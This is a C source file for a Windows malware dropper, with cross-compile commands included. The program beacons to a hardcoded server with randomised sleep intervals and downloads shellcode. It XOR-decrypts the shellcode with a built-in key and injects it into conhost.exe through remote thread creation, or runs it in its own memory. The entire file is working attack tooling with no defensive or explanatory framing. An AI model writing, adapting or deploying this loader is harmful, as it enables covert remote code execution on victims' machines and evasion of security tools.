#include <winsock2.h>
#include <tlhelp32.h>


#ifndef SERVER_IP
#define SERVER_IP "192.168.56.102"
#endif

#ifndef SERVER_PORT
#define SERVER_PORT 9002
#endif

#ifndef PASSWORD
#define PASSWORD "YoloSpaceHacker"
#endif

#ifndef INJECT_THREAD
#define INJECT_THREAD true
#endif

//explorer.exe conhost.exe  dllhost.exe
#ifndef PROCESS_NAME
#define PROCESS_NAME "conhost.exe"
#endif

// i686-w64-mingw32-gcc -o dropper dropper.c -lwsock32
// x86_64-w64-mingw32-gcc -o dropper dropper.c -lwsock32

#define BUFFER_SIZE 2048

int download(unsigned char* ip, int port, char* buffer)
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    serv_addr.sin_addr.s_addr = inet_addr(ip);

    int n = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    n = recv(sockfd, buffer, BUFFER_SIZE, 0);
    
    if (n == -1) {
        return -1;
    }
    
    closesocket(sockfd);
    WSACleanup();
    return n;
}


void decrypt(unsigned char* buffer, int size, char* password)
{
    for (int i = 0; i < size; i++) {
        buffer[i] = buffer[i] ^ password[i % strlen(password)];
    }
}


int get_process_id(char* process_name)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(procEntry);
    
    if (Process32First(hSnapshot, &procEntry)) {
        while (Process32Next(hSnapshot, &procEntry)) {
            if (!strcmp(procEntry.szExeFile, process_name))
            {
                CloseHandle(hSnapshot);
                return procEntry.th32ProcessID;
            }        
        }
    }
    
    return -1;
}

void create_thread(char* process_name, unsigned char* shellcode, int size)
{
    int process_id = get_process_id(process_name);

    if (process_id) {
        int rights = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

        HANDLE processHandle = OpenProcess(rights, FALSE, process_id);
        PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, shellcode, size, NULL);
        HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        
        WaitForSingleObject(processHandle, INFINITE);
        CloseHandle(processHandle);
    }
}


void exec(char* shellcode)
{
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}


int main()
{
    int port = SERVER_PORT;
    char ip[] = SERVER_IP;
    char buffer[BUFFER_SIZE];
    char password[] = PASSWORD;
    char process_name[] = PROCESS_NAME;
    bool inject_thread = INJECT_THREAD;
    bool run = true;

    while (run) {
        Sleep(10000 + (rand() % 10) * 500);
        int size = download(ip, port, buffer);

        
        if (size > -1) {

            if (size < 10) {
                if (strcmp(buffer, "exit") == 0) run = false;
            }
            else {
                decrypt(buffer, size, password);

                if (inject_thread) {
                    create_thread(process_name, buffer, size);
                }
                else {
                    exec(buffer);
                }


            }
        }

    }
    return 0;
}


